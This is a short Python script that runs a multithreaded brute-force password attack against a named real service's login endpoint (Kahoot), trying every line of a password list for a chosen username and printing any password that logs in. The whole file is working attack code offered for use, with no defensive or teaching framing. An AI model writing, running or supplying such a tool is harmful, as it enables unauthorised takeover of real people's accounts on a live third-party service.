import requests
import concurrent.futures

def brute_force_login(username):
    try:
        password_file = open("passlist.txt", "r")
        passwords = password_file.readlines()
        password_file.close()

        def check_password(password):
            password = password.strip()
            login_data = {
                "username": username,
                "password": password
            }
            response = requests.post("https://create.kahoot.it/auth/login", data=login_data)

            if response.status_code == 200:
                print("Login successful!")
                print("Username:", username)
                print("Password:", password)
                return True
            else:
                print("Login failed with password:", password)
                return False

        with concurrent.futures.ThreadPoolExecutor() as executor:
            results = executor.map(check_password, passwords)

        if not any(results):
            print("Brute force attack completed. No valid password found.")

    except FileNotFoundError:
        print("Password file not found.")
    except requests.exceptions.RequestException as e:
        print("An error occurred during the request:", str(e))
    except Exception as e:
        print("An unexpected error occurred:", str(e))

# Usage example
username = input("Enter the username: ")
brute_force_login(username)
